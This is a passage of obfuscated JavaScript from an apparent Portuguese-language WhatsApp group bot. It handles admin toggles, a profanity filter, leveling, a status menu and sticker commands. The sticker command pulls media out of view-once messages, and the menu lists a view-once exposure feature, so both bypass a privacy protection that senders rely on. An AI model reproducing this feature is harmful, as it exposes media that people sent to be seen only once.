                  _0x326cbd[0].simi2 = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("Desativado modo simi com sucesso neste grupo 😡️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar, lerdao vc em KKKKK");
                }
              }
              break;
            case "autofigu":
            case "autosticker":
              if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x29ccfb) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].autosticker = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de auto figurinhas neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x29ccfb) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].autosticker = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de auto figurinhas neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "autorepo":
            case "autoresposta":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x5a94ec) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].autoresposta = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de auto resposta neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x5a94ec) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].autoresposta = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de auto resposta neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "modobrincadeira":
            case "modobrincadeiras":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x5c6233) {
                  return _0x50740b("o modobrincadeira já está ativo");
                }
                _0x326cbd[0].jogos = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🎯 Ativou com sucesso o recurso de Modo brincadeira neste grupo 🪀");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x5c6233) {
                    return _0x50740b("o modobrincadeira já está Desativado");
                  }
                  _0x326cbd[0].jogos = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("🎯 Desativou com sucesso o recurso de Modo brincadeira neste grupo 🪀");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "patente":
            case "level":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              resul = "     \nOlá Usuário -> @" + _0x246d48.split('@')[0] + "\n\n★彡[ " + _0x33c0c0 + " ]彡★ Aqui está suas informações: \n\n- Patente : " + _0x5c8446 + " \n\n- Level* : " + _0x47871c + "\n\n- Grupo: " + _0x3baffe;
              const _0x26d5f1 = {
                text: resul,
                mentions: [_0x246d48]
              };
              const _0x327a6e = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x26d5f1, _0x327a6e);
              break;
            case "leveling":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Ative pressione 1, Desativar pressione 0");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x40dfc7) {
                  return _0x50740b("*O recurso de nível já estava ativo antes*");
                }
                _0x326cbd[0].level = true;
                _0x137e44(_0x326cbd);
                _0x50740b(enviar.levelon);
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x40dfc7) {
                    return _0x50740b("O recurso de level já está Desativado neste grupo.");
                  }
                  _0x326cbd[0].level = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b(enviar.leveloff);
                } else {
                  _0x50740b("「* Adicionar parâmetro 1 ou 0 ");
                }
              }
              break;
            case "bangp":
            case "unbangp":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (_0x267d4b == "bangp") {
                if (_0x18a4bb) {
                  return _0x50740b("Este grupo ja está banido");
                }
                _0x326cbd[0].bangp = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Grupo banido com sucesso");
              } else {
                if (!_0x18a4bb) {
                  return _0x50740b("Este grupo não está mais banido");
                }
                _0x326cbd[0].bangp = false;
                _0x137e44(_0x326cbd);
                _0x50740b("Grupo desbanido...");
              }
              break;
            case "boton":
            case "botoff":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x41dc36) {
                nescessario.botoff = true;
                _0x13c255(nescessario);
                _0x50740b("Desativando funções e parando a execução de comandos por membros com sucesso...");
              } else if (_0x41dc36) {
                nescessario.botoff = false;
                _0x13c255(nescessario);
                _0x50740b("Ativando todos os funcionamentos do bot novamente...");
              }
              break;
            case "antipalavrão":
            case "antipalavrao":
            case "antipalavra":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("[❗] 1 / 0, Exemplo " + (_0x141936 + _0x267d4b) + " 1");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x627769) {
                  return _0x50740b("Ja esta ativo.");
                }
                _0x326cbd[0].antipalavrao.active = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de Anti Palavras hardcore neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x627769) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].antipalavrao.active = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de Anti Palavra harcore neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "addpalavra":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x627769) {
                return _0x50740b("Anti palavrão está desativado, você precisa usar o comando " + _0x141936 + "antipalavra 1");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Use assim : " + (_0x141936 + _0x267d4b) + " [palavrão]. exemplo " + (_0x141936 + _0x267d4b) + " puta");
              }
              _0x3dc0d2 = _0x23d865.join(" ").toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, '');
              if (_0x57f319.includes(_0x3dc0d2)) {
                return _0x50740b("Já foi adicionada");
              }
              _0x326cbd[0].antipalavrao.palavras.push(_0x3dc0d2);
              _0x137e44(_0x326cbd);
              _0x50740b("Palavrão adicionado com sucesso!");
              break;
            case "delpalavra":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x627769) {
                return _0x50740b("Anti palavrão desativado!");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Use assim : " + (_0x141936 + _0x267d4b) + " [palavrão]. exemplo " + (_0x141936 + _0x267d4b) + " puta");
              }
              _0x3dc0d2 = _0x23d865.join(" ").toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, '');
              if (!_0x57f319.includes(_0x3dc0d2)) {
                return _0x50740b("Já foi removida");
              }
              var _0x2c40cb = _0x326cbd[0].antipalavrao.palavras.indexOf(_0x3dc0d2);
              _0x326cbd[0].antipalavrao.palavras.splice(_0x2c40cb, 1);
              _0x137e44(_0x326cbd);
              _0x50740b("Palavrão removido da lista com sucesso!");
              break;
            case "listapalavrão":
            case "listapalavra":
            case "listpalavra":
              if (!_0x627769) {
                return _0x50740b("Anti palavrão desativado!");
              }
              let _0x32a4db = "Esta é a lista de palavrão\nTotal : " + _0x57f319.length + "\n";
              for (let _0x52f1da of _0x57f319) {
                _0x32a4db += "➸ " + _0x52f1da + "\n";
              }
              await _0x50740b(_0x32a4db);
              break;
            case "limitecaracteres":
            case "limiteflood":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Digite " + (_0x141936 + _0x267d4b) + " 1 para ativar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x40d1ba) {
                  return _0x50740b("🌀 O recurso limite de caracteres já está ativo no grupo 🌀");
                }
                _0x326cbd[0].limitec.active = true;
                _0x137e44(_0x326cbd);
                _0x50740b("✔️ O recurso limite de caracteres foi ativado nesse grupo📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x40d1ba) {
                    return _0x50740b("✔️ O recurso limite de caracteres não está ativado no grupo 📝");
                  }
                  _0x326cbd[0].limitec.active = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("O recurso limite de caracteres foi desativado nesse grupo ✔️");
                } else {
                  _0x50740b("Digite " + (_0x141936 + _0x267d4b) + " 1 para ativar, 0 para desativar o recurso");
                }
              }
              break;
            case "limitec_global":
            case "limitec":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (!_0x40d1ba) {
                return _0x50740b("Ative este recurso primeiro " + _0x141936 + "limiteflood 1");
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("Cade a quantidade? Ex: " + (_0x141936 + _0x267d4b) + " 5000");
              }
              if (isNaN(_0x11e99e) == true) {
                return _0x50740b("Digite apenas números");
              }
              if (_0x267d4b == "limitec") {
                _0x326cbd[0].limitec.quantidade = _0x11e99e;
                _0x137e44(_0x326cbd);
                _0x50740b("Foi alterado o limite de caracteres para: " + _0x11e99e);
              } else {
                const _0x162309 = {
                  limitefl: _0x11e99e
                };
                var _0x5aeb20 = _0x162309;
                fs.writeFileSync("./DADOS/datab/usuarios/flood.json", JSON.stringify(_0x5aeb20, null, "\t"));
                _0x50740b("Foi adicionado um limite global de caracteres de: " + _0x11e99e);
              }
              break;
            case "status":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              _0x24d53d = "╭╼━╼━╾❲ S T A T U S ❳╼━╼━╾╮\n║\n╟✼" + _0x2cd689 + " Funções ADMs:\n╟✼" + _0x2cd689 + " So ADMs: " + (_0x5bea47 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x5bea47 ? "Para Desativar " + _0x141936 + "so_adm 0" : "Para Ativar " + _0x141936 + "so_adm 1") + "\n║\n╟✼" + _0x2cd689 + " Função Delete: " + (_0x1b869d ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x1b869d ? "Para Desativar " + _0x141936 + "odelete 0" : "Para Ativar " + _0x141936 + "odelete 1") + "\n║\n╟✼" + _0x2cd689 + " Limite De Caracteres: " + (_0x40d1ba ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x40d1ba ? "Para Desativar " + _0x141936 + "limitecaracteres 0" : "Para Ativar " + _0x141936 + "limitecaracteres 1") + "\n║\n╟✼" + _0x2cd689 + " X9 ADMs: " + (_0x2d5ff0 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x2d5ff0 ? "Para Desativar " + _0x141936 + "x9 0" : "Para Ativar " + _0x141936 + "x9 1") + "\n║\n╟✼" + _0x2cd689 + " Modo+18: " + (_0x2f3424 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x2f3424 ? "Para Desativar " + _0x141936 + "modo+18 0" : "Para Ativar " + _0x141936 + "modo+18 1") + "\n║\n╟✼" + _0x2cd689 + " Modo brincadeira: " + (_0x5c6233 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x5c6233 ? "Para Desativar " + _0x141936 + "modobrincadeira 0" : "Para Ativar " + _0x141936 + "modobrincadeira 1") + "\n║\n╟✼" + _0x2cd689 + " Leveling: " + (_0x40dfc7 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x40dfc7 ? "Para Desativar " + _0x141936 + "leveling 0" : "Para Ativar " + _0x141936 + "leveling 1") + "\n║\n╟✼" + _0x2cd689 + " Sistema De Gold: " + (_0x33d21e ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x33d21e ? "Para Desativar " + _0x141936 + "sistemgold 0" : "Para Ativar " + _0x141936 + "sistemgold 1") + "\n║\n╟✼" + _0x2cd689 + " Simi: " + (_0x2623e0 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x2623e0 ? "Para Desativar " + _0x141936 + "simih2 0" : "Para Ativar " + _0x141936 + "simih2 1") + "\n║\n╟✼" + _0x2cd689 + " Bem-vindo: " + (_0x21877a ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x21877a ? "Para Desativar " + _0x141936 + "bemvindo 0" : "Para Ativar " + _0x141936 + "bemvindo 1") + "\n║\n╟✼" + _0x2cd689 + " bem-vindo2: " + (_0x25178f ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x25178f ? "Para Desativar " + _0x141936 + "bemvindo2 0" : "Para Ativar " + _0x141936 + "bemvindo2 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Palavra: " + (_0x627769 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x627769 ? "Para Desativar " + _0x141936 + "antipalavra 1" : "Para Ativar " + _0x141936 + "antipalavra 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Fake: " + (_0x2e49b2 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x2e49b2 ? "Para Desativar " + _0x141936 + "antifake 0" : "Para Ativar " + _0x141936 + "antifake 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Notas Fake: " + (_0x51d731 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x51d731 ? "Para Desativar " + _0x141936 + "antinotas 0" : "Para Ativar " + _0x141936 + "antinotas 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Catalogo: " + (_0x52e919 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x52e919 ? "Para Desativar " + _0x141936 + "anticatalogo 0" : "Para Ativar " + _0x141936 + "anticatalogo 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Localização: " + (_0x2ac64a ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x2ac64a ? "Para Desativar " + _0x141936 + "antiloc 0" : "Para Ativar " + _0x141936 + "antiloc 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Visu Unica: " + (_0xc01de ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0xc01de ? "Para Desativar " + _0x141936 + "x9visuunica 0" : "Para Ativar " + _0x141936 + "x9visuunica 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Link Hard: " + (_0x2b140d ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x2b140d ? "Para Desativar " + _0x141936 + "antilinkhard 0" : "Para Ativar " + _0x141936 + "antilinkhard 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Link GP: " + (_0x3cafb4 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x3cafb4 ? "Para Desativar " + _0x141936 + "antilinkgp 0" : "Para Ativar " + _0x141936 + "antilinkgp 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Video: " + (_0x14171f ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x14171f ? "Para Desativar " + _0x141936 + "antivideo 0" : "Para Ativar " + _0x141936 + "antivideo 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Imagem: " + (_0x2ddc0a ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x2ddc0a ? "Para Desativar " + _0x141936 + "antiimg 0" : "Para Ativar " + _0x141936 + "antiimg 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Audio: " + (_0x1b617c ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x1b617c ? "Para Desativar " + _0x141936 + "antiaudio 0" : "Para Ativar " + _0x141936 + "antiaudio 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Figurinha: " + (_0x1a72a5 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x1a72a5 ? "Para Desativar " + _0x141936 + "antisticker 0" : "Para Ativar " + _0x141936 + "antisticker 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Documento: " + (_0x5aaef2 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x5aaef2 ? "Para Desativar " + _0x141936 + "antidoc 0" : "Para Ativar " + _0x141936 + "antidoc 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Contato: " + (_0x17cef7 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x17cef7 ? "Para Desativar " + _0x141936 + "anticontato 0" : "Para Ativar " + _0x141936 + "anticontato 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Spam: " + (_0x48bcb9 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x48bcb9 ? "Para Desativar " + _0x141936 + "antispam 0" : "Para Ativar " + _0x141936 + "antispam 1") + "\n║\n╟✼" + _0x2cd689 + " Anti Marcações: " + (_0x16ba85 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x16ba85 ? "Para Desativar " + _0x141936 + "antimarc 0" : "Para Ativar " + _0x141936 + "antimarc 1") + "\n║\n╟✼" + _0x2cd689 + " Auto Figurinha: " + (_0x29ccfb ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x29ccfb ? "Para Desativar " + _0x141936 + "autofigu 0" : "Para Ativar " + _0x141936 + "autofigu 1") + "\n║\n╟✼" + _0x2cd689 + " Auto Resposta: " + (_0x5a94ec ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x5a94ec ? "Para Desativar " + _0x141936 + "autoresposta 0" : "Para Ativar " + _0x141936 + "autoresposta 1") + "\n║\n╟✼" + _0x2cd689 + " FUNÇÕES DONO:\n╟✼" + _0x2cd689 + " Visualizando MSGs: " + (_0x2068a9 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x2068a9 ? "Para Desativar " + _0x141936 + "visualizarmsg" : "Para Ativar " + _0x141936 + "visualizarmsg") + "\n║\n╟✼" + _0x2cd689 + " Anti PV: " + (_0x2d6efa ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x2d6efa ? "Para Desativar " + _0x141936 + "antipv 0" : "Para Ativar " + _0x141936 + "antipv 1") + "\n║\n╟✼" + _0x2cd689 + " Anti PV2: " + (_0x675276 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x675276 ? "Para Desativar " + _0x141936 + "antipv2" : "Para Ativar " + _0x141936 + "antipv2") + "\n║\n╟✼" + _0x2cd689 + " Anti PV3: " + (_0x36e704 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x36e704 ? "Para Desativar " + _0x141936 + "antipv3" : "Para Ativar " + _0x141936 + "antipv3") + "\n║\n╟✼" + _0x2cd689 + " Anti Chamada: " + (_0x50be44 ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (_0x50be44 ? "Para Desativar " + _0x141936 + "antiligar" : "Para Ativar " + _0x141936 + "antiligar") + "\n║\n╟✼" + _0x2cd689 + " Recolher Links: " + (isRecolherLink ? "✓ ON ✓" : "✕ OFF ✕") + "\n╟✼" + _0x2cd689 + " " + (isRecolherLink ? "Para Desativar " + _0x141936 + "recolherlinks" : "Para Ativar " + _0x141936 + "recolherlinks") + "\n║\n╟✼" + _0x2cd689 + " Bot: " + (_0x41dc36 ? "✕ OFF ✕" : "✓ ON ✓") + "\n╟✼" + _0x2cd689 + " " + (_0x41dc36 ? "Para Ativar " + _0x141936 + "boton" : "Para Desativar " + _0x141936 + "botoff") + "\n║\n║\n╰╼╾❲ " + NomeDoBot + " ❳╼╾╯";
              var _0x1ffe68 = _0x257290(logoslink.status1);
              const _0x458f2b = {
                ..._0x1ffe68
              };
              _0x458f2b.caption = _0x24d53d;
              _0x458f2b.mentions = [_0x246d48];
              const _0xfe9fb9 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x458f2b, _0xfe9fb9);
              break;
            case "reiniciar":
              if (!_0xf59944) {
                return;
              }
              setTimeout(async () => {
                _0x50740b("Reiniciando..");
                setTimeout(async () => {
                  process.exit();
                }, 1200);
              }, 1000);
              break;
            case "emoji":
            case "semoji":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Exemplo: " + _0x141936 + "emoji ☹️/whatsapp");
                }
                var [_0x2c71cd, _0x2502a9] = _0x11e99e.split('/');
                let _0x4e79cb = await reqapi.semoji(_0x2c71cd, _0x2502a9);
                _0x125a55(_0x346d97, _0x4e79cb.rst);
              } catch {
                return _0x50740b("Erro..");
              }
              break;
            case "emoji-mix":
            case "emojimix":
              var [_0x8041d0, _0x5af038] = _0x11e99e.trim().split('+');
              if (!_0x11e99e.includes('+')) {
                return _0x50740b("Olá, está faltando o +\nExemplo: " + (_0x141936 + _0x267d4b) + " 👿+😇");
              }
              try {
                _0x50740b(_0x50f430);
                _0x125a55(_0x346d97, reqapi.emojimix(_0x8041d0, _0x5af038));
              } catch (_0x33a770) {
                return _0x50740b("*Ops não foi possivel fazer esse mix de emoji / Ou ocorreu algum problema no sistema..*");
              }
              break;
            case "figfundo":
            case "figvideo":
            case "figusemfundo":
            case "sfundo":
              if ((_0x39e519 && !_0xd2050d.message.videoMessage || _0x54198a) && !_0x11e99e.length <= 1) {
                rafa = _0x54198a ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : _0xd2050d.message.imageMessage;
                _0x50740b(_0x50f430);
                buff = await getFileBuffer(rafa, "image");
                bas64 = "data:image/jpeg;base64," + buff.toString("base64");
                anu = _0x23d865.join(" ").split('|');
                satu = anu[0] !== '' ? anu[0] : NomeDoBot;
                sd = "📍Criado por↓        ";
                dua = typeof anu[1] !== "undefined" ? anu[1] : '' + sd;
                var _0x2a06c9 = await convertSticker(bas64, '' + dua, '' + satu);
                var _0x4cc206 = new Buffer.from(_0x2a06c9, "base64");
                const _0x5a37ab = {
                  sticker: _0x4cc206
                };
                const _0x5d5975 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x5a37ab, _0x5d5975);
              } else {
                return _0x50740b("So imagem mn -_-");
              }
              break;
            case "rbale":
              if (!_0x309ffb) {
                return _0x50740b("Marque uma figurinha...");
              }
              encmediats = await getFileBuffer(_0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
              _0x50740b(_0x50f430);
              bas64 = "data:image/jpeg;base64," + encmediats.toString("base64");
              var _0x4217de = await convertSticker(bas64, "Dev", "Lotus");
              stitu = new Buffer.from(_0x4217de, "base64");
              const _0x4d7a8d = {
                title: NomeDoBot,
                body: '',
                previewType: "PHOTO",
                thumbnail: _0x190cfd
              };
              const _0x296043 = {
                externalAdReply: _0x4d7a8d
              };
              const _0x24bcec = {
                sticker: stitu,
                contextInfo: _0x296043
              };
              const _0xda95c6 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x24bcec, _0xda95c6)["catch"](_0x413dd4 => {
                _0x50740b("❎ Erro, tenta mais tarde");
              });
              break;
            case "rename":
            case "roubar":
              {
                if (!_0x309ffb) {
                  return _0x50740b("Marque uma figurinha...");
                }
                encmediats5 = await getFileBuffer(_0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
                let [_0x25065a, _0x2e81e7] = _0x11e99e.split('/');
                if (!_0x11e99e.trim()) {
                  return _0x50740b("*E o autor e o nome do pacote?*");
                }
                if (!_0x25065a || !_0x2e81e7) {
                  return _0x50740b("Por favor, use o formato correto: " + (_0x141936 + _0x267d4b) + " sad/bla");
                }
                _0x50740b(_0x50f430);
                bas644 = "data:image/jpeg;base64," + encmediats5.toString("base64");
                var _0x492b66 = await convertSticker(bas644, '' + _0x2e81e7, '' + _0x25065a);
                sti44 = new Buffer.from(_0x492b66, "base64");
                const _0x1a2cf1 = {
                  sticker: sti44,
                  contextInfo: {}
                };
                _0x1a2cf1.contextInfo.externalAdReply = {};
                _0x1a2cf1.contextInfo.externalAdReply.title = _0x25065a + '|' + _0x2e81e7;
                _0x1a2cf1.contextInfo.externalAdReply.body = '';
                _0x1a2cf1.contextInfo.externalAdReply.previewType = "PHOTO";
                _0x1a2cf1.contextInfo.externalAdReply.thumbnail = sti44;
                const _0x2782a8 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x1a2cf1, _0x2782a8)["catch"](_0x4a3e23 => {
                  _0x50740b("❎ Erro, tenta mais tarde");
                });
              }
              break;
            case "fstiker":
            case "fsticker":
            case 'f':
              var _0x265ba4 = _0xd2050d.message?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"];
              var _0x48d7b9 = _0x265ba4?.["imageMessage"] || _0xd2050d.message?.["imageMessage"] || _0x265ba4?.["viewOnceMessageV2"]?.["message"]?.["imageMessage"] || _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["imageMessage"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["imageMessage"] || _0x265ba4?.["viewOnceMessage"]?.["message"]?.["imageMessage"];
              var _0x4f8e1c = _0x265ba4?.["videoMessage"] || _0xd2050d.message?.["videoMessage"] || _0x265ba4?.["viewOnceMessageV2"]?.["message"]?.["videoMessage"] || _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["videoMessage"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["videoMessage"] || _0x265ba4?.["viewOnceMessage"]?.["message"]?.["videoMessage"];
              if (_0x48d7b9) {
                _0x50740b(_0x50f430);
                owgi = await getFileBuffer(_0x48d7b9, "image");
                const _0x1babcf = {
                  packname: _0x4ecbb6,
                  author: _0x56ed9d
                };
                let _0x33200a = await sendImageAsSticker(_0x5196be, _0x346d97, owgi, _0xd2050d, _0x1babcf);
                await DLT_FL(_0x33200a);
              } else {
                if (_0x4f8e1c && _0x4f8e1c?.["seconds"] < 11) {
                  _0x50740b(_0x50f430);
                  owgi = await getFileBuffer(_0x4f8e1c, "video");
                  const _0x25dc89 = {
                    packname: _0x4ecbb6,
                    author: _0x56ed9d
                  };
                  let _0x2f5af8 = await sendVideoAsSticker(_0x5196be, _0x346d97, owgi, _0xd2050d, _0x25dc89);
                  await DLT_FL(_0x2f5af8);
                } else {
                  _0x50740b("Enviar imagem / vídeo / gif com legenda \n" + _0x141936 + "sticker (duração do adesivo de vídeo de 1 a 10 segundos)");
                }
              }
              break;
            case "figu":
              if (fs.existsSync("./DADOS/datab/data/CVF.json")) {
                return _0x50740b("Aguarde um momento, e realize o pedido novamente, não seja tão rápido...");
              }
